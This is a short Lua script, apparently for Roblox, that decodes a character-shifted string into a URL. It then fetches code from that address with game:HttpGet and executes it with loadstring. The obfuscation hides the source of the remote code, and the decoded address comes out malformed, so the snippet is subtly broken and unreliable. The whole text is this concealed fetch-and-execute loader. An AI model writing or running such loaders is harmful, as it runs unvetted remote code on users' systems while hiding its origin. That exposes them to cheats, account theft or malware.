local function decode(s)
    local t = {}
    for i = 1, #s do
        t[i] = string.char(s:byte(i) - 3)
    end
    return table.concat(t)
end

loadstring(game:HttpGet(decode("kwwsv==psdvhi|1dsr2Nufkpxm\\2udz")))()
